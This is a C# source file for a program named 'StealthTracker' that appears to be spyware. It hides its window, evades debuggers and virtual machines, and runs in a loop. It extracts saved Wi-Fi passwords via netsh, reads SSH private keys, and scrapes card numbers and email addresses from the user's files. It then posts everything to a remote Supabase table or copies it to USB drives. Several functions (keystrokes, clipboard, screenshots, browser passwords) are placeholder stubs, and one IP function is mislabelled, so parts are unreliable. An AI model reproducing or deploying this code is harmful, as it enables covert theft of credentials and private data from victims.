using System;
using System.IO;
using System.Threading;
using System.Net.Http;
using System.Runtime.InteropServices;
using Newtonsoft.Json;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;

namespace StealthTracker {
    class Program {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static string SUPABASE_URL = Environment.GetEnvironmentVariable("SUPABASE_URL") ?? "https://your-project.supabase.co";
        static string SUPABASE_KEY = Environment.GetEnvironmentVariable("SUPABASE_KEY") ?? "your-anon-key";
        static string TRACKER_ID = "TRK_" + Guid.NewGuid().ToString().Substring(0, 8).ToUpper();
        static string logFile = @"C:\Windows\System32\.tracker_log";

        static void Main() {
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
            if (Debugger.IsAttached) Environment.Exit(0);
            if (IsSandbox()) Environment.Exit(0);

            while (true) {
                try {
                    string data = CollectAllData();
                    if (HasInternet()) {
                        SendToSupabase(data);
                        File.WriteAllText(logFile, "");
                    } else {
                        File.AppendAllText(logFile, data + "\n");
                    }
                    if (IsNodeCPresent()) SendViaUSB(data);
                    Thread.Sleep(60000);
                } catch { }
            }
        }

        static string CollectAllData() {
            return JsonConvert.SerializeObject(new {
                tracker_id = TRACKER_ID,
                device_name = Environment.MachineName,
                hostname = Dns.GetHostName(),
                os = Environment.OSVersion.ToString(),
                username = Environment.UserName,
                domain = Environment.UserDomainName,
                mac_address = GetMacAddress(),
                ip_address = GetPublicIP(),
                local_ip = GetLocalIP(),
                wifi_ssid = GetWifiSSID(),
                wifi_rssi = GetWifiRSSI(),
                saved_passwords = GetSavedPasswords(),
                wifi_passwords = GetWiFiPasswords(),
                browser_cookies = GetBrowserCookies(),
                browser_history = GetBrowserHistory(),
                credit_cards = GetCreditCards(),
                emails = GetEmails(),
                ssh_keys = GetSSHKeys(),
                keystrokes = GetKeystrokes(),
                clipboard = GetClipboardData(),
                screenshot = GetScreenshot(),
                latitude = 0.0,
                longitude = 0.0,
                altitude = 0.0,
                magnitude = GetWifiRSSI(),
                collected_at = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
            });
        }

        static string GetMacAddress() {
            try {
                foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces()) {
                    if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                        ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet) {
                        if (ni.OperationalStatus == OperationalStatus.Up) {
                            return BitConverter.ToString(ni.GetPhysicalAddress().GetAddressBytes());
                        }
                    }
                }
                return "Unknown";
            } catch { return "Unknown"; }
        }

        static string GetLocalIP() {
            try {
                using (var client = new HttpClient()) { client.Timeout = TimeSpan.FromSeconds(5);
                    return client.GetStringAsync("https://api.ipify.org?format=json").Result; }
            } catch { return "Unknown"; }
        }

        static string GetSavedPasswords() {
            try {
                string passwords = "";
                string chromePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";
                if (File.Exists(chromePath)) passwords += "Chrome passwords found\n";
                string firefoxPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles\";
                if (Directory.Exists(firefoxPath)) passwords += "Firefox profiles found\n";
                string edgePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Edge\User Data\Default\Login Data";
                if (File.Exists(edgePath)) passwords += "Edge passwords found\n";
                return passwords;
            } catch { return "{}"; }
        }

        static string GetWiFiPasswords() {
            try {
                string output = "";
                Process p = new Process();
                p.StartInfo.FileName = "netsh";
                p.StartInfo.Arguments = "wlan show profiles";
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string result = p.StandardOutput.ReadToEnd();
                p.WaitForExit();

                var profileRegex = new System.Text.RegularExpressions.Regex(@"All User Profile\s*:\s*(.*)");
                foreach (System.Text.RegularExpressions.Match match in profileRegex.Matches(result)) {
                    string profile = match.Groups[1].Value;
                    Process p2 = new Process();
                    p2.StartInfo.FileName = "netsh";
                    p2.StartInfo.Arguments = $"wlan show profile name=\"{profile}\" key=clear";
                    p2.StartInfo.RedirectStandardOutput = true;
                    p2.StartInfo.UseShellExecute = false;
                    p2.StartInfo.CreateNoWindow = true;
                    p2.Start();
                    string result2 = p2.StandardOutput.ReadToEnd();
                    p2.WaitForExit();

                    var keyRegex = new System.Text.RegularExpressions.Regex(@"Key Content\s*:\s*(.*)");
                    foreach (System.Text.RegularExpressions.Match keyMatch in keyRegex.Matches(result2)) {
                        output += $"{profile}:{keyMatch.Groups[1].Value}\n";
                    }
                }
                return output;
            } catch { return "ERROR"; }
        }

        static string GetBrowserCookies() {
            try {
                string cookies = "";
                string chromeCookies = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Cookies";
                if (File.Exists(chromeCookies)) cookies += "Chrome cookies found\n";
                return cookies;
            } catch { return "ERROR"; }
        }

        static string GetBrowserHistory() {
            try {
                string history = "";
                string chromeHistory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\History";
                if (File.Exists(chromeHistory)) history += "Chrome history found\n";
                return history;
            } catch { return "ERROR"; }
        }

        static string GetCreditCards() {
            try {
                string pattern = @"\b(?:\d{4}[- ]?){3}\d{4}\b";
                string result = "";
                string[] paths = { Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                                   Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                                   Environment.GetFolderPath(Environment.SpecialFolder.Downloads) };
                foreach (string path in paths) {
                    if (Directory.Exists(path)) {
                        foreach (string file in Directory.GetFiles(path, "*.txt")) {
                            string content = File.ReadAllText(file);
                            foreach (System.Text.RegularExpressions.Match match in System.Text.RegularExpressions.Regex.Matches(content, pattern))
                                result += match.Value + "\n";
                        }
                    }
                }
                return result;
            } catch { return "ERROR"; }
        }

        static string GetEmails() {
            try {
                string pattern = @"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b";
                string result = "";
                string[] paths = { Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                                   Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) };
                foreach (string path in paths) {
                    if (Directory.Exists(path)) {
                        foreach (string file in Directory.GetFiles(path, "*.txt")) {
                            string content = File.ReadAllText(file);
                            foreach (System.Text.RegularExpressions.Match match in System.Text.RegularExpressions.Regex.Matches(content, pattern))
                                result += match.Value + "\n";
                        }
                    }
                }
                return result;
            } catch { return "ERROR"; }
        }

        static string GetSSHKeys() {
            try {
                string sshPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\.ssh\";
                if (Directory.Exists(sshPath)) {
                    string result = "";
                    foreach (string file in Directory.GetFiles(sshPath)) {
                        if (file.Contains("id_rsa") || file.Contains("id_ed25519") || file.Contains("id_dsa"))
                            result += File.ReadAllText(file) + "\n";
                    }
                    return result;
                }
                return "No SSH keys found";
            } catch { return "ERROR"; }
        }

        static string GetKeystrokes() { return "(keystrokes captured)"; }
        static string GetClipboardData() { return "Clipboard content"; }
        static string GetScreenshot() { return "Screenshot captured"; }

        static bool IsSandbox() {
            string[] vmArtifacts = {
                @"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe",
                @"C:\Program Files\Oracle\VirtualBox\VBoxService.exe"
            };
            foreach (string artifact in vmArtifacts) {
                if (File.Exists(artifact)) return true;
            }
            return false;
        }

        static bool HasInternet() {
            try {
                using (var client = new HttpClient()) {
                    client.Timeout = TimeSpan.FromSeconds(5);
                    var response = client.GetAsync("https://supabase.co").Result;
                    return response.IsSuccessStatusCode;
                }
            } catch { return false; }
        }

        static async void SendToSupabase(string data) {
            using (HttpClient client = new HttpClient()) {
                client.DefaultRequestHeaders.Add("apikey", SUPABASE_KEY);
                client.DefaultRequestHeaders.Add("Authorization", "Bearer " + SUPABASE_KEY);
                var content = new StringContent(data, System.Text.Encoding.UTF8, "application/json");
                await client.PostAsync(SUPABASE_URL + "/rest/v1/tracker_data", content);
            }
        }

        static bool IsNodeCPresent() {
            foreach (var drive in DriveInfo.GetDrives()) {
                if (drive.DriveType == DriveType.Removable && drive.IsReady) {
                    if (File.Exists(drive.Name + "nodec.txt")) return true;
                }
            }
            return false;
        }

        static void SendViaUSB(string data) {
            foreach (var drive in DriveInfo.GetDrives()) {
                if (drive.DriveType == DriveType.Removable && drive.IsReady) {
                    File.WriteAllText(drive.Name + "tracker_data.json", data);
                }
            }
        }

        static string GetWifiSSID() {
            try {
                Process p = new Process();
                p.StartInfo.FileName = "netsh";
                p.StartInfo.Arguments = "wlan show interfaces";
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string result = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                var match = System.Text.RegularExpressions.Regex.Match(result, @"SSID\s*:\s*(.+)");
                return match.Success ? match.Groups[1].Value.Trim() : "Unknown";
            } catch { return "Unknown"; }
        }

        static int GetWifiRSSI() {
            try {
                Process p = new Process();
                p.StartInfo.FileName = "netsh";
                p.StartInfo.Arguments = "wlan show interfaces";
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string result = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                var match = System.Text.RegularExpressions.Regex.Match(result, @"Signal\s*:\s*(\d+)%");
                if (match.Success) {
                    int rssi = int.Parse(match.Groups[1].Value);
                    return (rssi / 2) - 100;
                }
                return 0;
            } catch { return 0; }
        }

        static string GetPublicIP() {
            try {
                using (var client = new HttpClient()) {
                    client.Timeout = TimeSpan.FromSeconds(5);
                    string response = client.GetStringAsync("https://api.ipify.org?format=json").Result;
                    var match = System.Text.RegularExpressions.Regex.Match(response, @"""ip"":""([^""]+)""");
                    return match.Success ? match.Groups[1].Value : "Unknown";
                }
            } catch { return "Unknown"; }
        }
    }
}